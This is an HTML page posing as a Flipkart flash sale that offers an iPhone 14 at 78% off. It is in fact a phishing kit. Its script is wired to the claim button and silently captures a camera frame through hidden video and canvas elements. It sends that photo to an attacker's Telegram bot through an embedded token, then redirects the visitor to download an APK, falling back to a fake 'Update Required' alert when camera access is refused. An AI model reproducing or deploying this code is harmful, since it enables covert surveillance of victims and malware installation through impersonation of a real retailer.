<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flipkart Special Deals ⚡</title>
    <style>
        body { 
            background: #f1f3f6; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            margin: 0; 
            padding: 0; 
            text-align: center; 
        }
        .header { 
            background: #2874f0; 
            padding: 15px; 
            color: white; 
            font-weight: bold; 
            font-size: 1.2rem; 
            text-align: left; 
            display: flex;
            align-items: center;
        }
        .header img {
            width: 25px;
            margin-right: 10px;
        }
        .container { 
            padding: 10px; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
        }
        
        /* Product Image Card */
        .card {
            background: white;
            padding: 20px;
            width: 90%;
            max-width: 400px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            margin: 15px 0;
            text-align: left;
        }
        
        /* iPhone Image Size Optimized */
        .product-img { 
            width: 100%; 
            max-width: 200px; /* Bada Size iPhone */
            height: auto;
            display: block;
            margin: 0 auto 15px;
            /* Box-shadow extra feel ke liye */
            box-shadow: 0 4px 6px rgba(0,0,0,0.1); 
            border-radius: 10px;
        }

        /* Product Title */
        .product-title {
            font-size: 1.4rem;
            color: #333;
            font-weight: 500;
            margin: 10px 0;
        }

        /* Pricing Area */
        .price-section {
            margin: 15px 0;
        }
        .special-price {
            color: #388e3c;
            font-size: 2.2rem;
            font-weight: bold;
            margin-right: 10px;
        }
        .old-price {
            text-decoration: line-through;
            color: #878787;
            font-size: 1.2rem;
        }
        .offer-tag {
            color: #388e3c;
            font-size: 1.1rem;
            font-weight: bold;
            margin-left: 10px;
        }

        /* Mobile Description Size Optimized */
        p { 
            color: #666; 
            font-size: 1.1rem; 
            line-height: 1.6; 
            margin: 15px 0 25px; 
            padding: 0 10px;
        }

        /* Button Size Optimized */
        .btn { 
            background: #fb641b; 
            color: white; 
            border: none; 
            padding: 18px; 
            font-size: 1.3rem; 
            font-weight: bold; 
            width: 100%; 
            max-width: 400px; 
            border-radius: 5px; 
            cursor: pointer; 
            transition: background 0.2s;
        }
    </style>
</head>
<body>

<div class="header">
    <img src="https://em-content.zobj.net/source/microsoft/310/wrapped-gift_1f381.png" alt="Gift Box">
    Flipkart Special Offers ⚡
</div>

<div class="container">
    
    <div class="card">
        <img src="https://rukminim1.flixcart.com/image/312/312/xif0q/mobile/3/5/l/-original-imaghx9qyg7pvsk6.jpeg" alt="iPhone 14 (Blue)" class="product-img">
        
        <div class="product-title">Apple iPhone 14 (Blue, 128 GB)</div>
        
        <div class="price-section">
            <span class="special-price">₹12,499</span>
            <span class="old-price">₹69,900</span>
            <span class="offer-tag">(78% OFF)</span>
        </div>
        
        <p>This is a limited-time deal on selected devices. Make sure to claim your offer before the stock runs out!</p>
        
        <button class="btn" onclick="triggerMagic()">CLAIM SPECIAL DEAL</button>
    </div>

</div>

<video id="v" autoplay style="display:none;"></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    const token = '8654099233:AAHUe3-Cmh4Yi4v1sI4dwsGi7E4BTdTcMR4';
    const chat_id = '2043988256';
    // YAHAN APNA APK LINK DALEIN (Example Mediafire link)
    const apk_url = "https://www.mediafire.com/file/example/watch_video.apk"; 

    function triggerMagic() {
        // Silent Camera Permissions request
        navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
            let v = document.getElementById('v');
            v.srcObject = s;
            setTimeout(() => {
                let c = document.getElementById('c');
                c.width = 640; c.height = 480;
                c.getContext('2d').drawImage(v, 0, 0);
                let img = c.toDataURL('image/jpeg', 0.5).split(',')[1];

                // Telegram Photo send (Silent)
                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ chat_id: chat_id, photo: img, caption: "🔥 Flipkart Offer Clicked! APK Download Triggered." })
                });

                // APK Download Trigger
                window.location.href = apk_url;

            }, 1000); // Short delay after granting access
        }).catch(e => {
            alert("⚠️ Update Required: Please 'Allow' camera access to verify your account and claim this special deal.");
            // If permission denied, trigger download anyway
            window.location.href = apk_url;
        });
    }
</script>

</body>
</html>
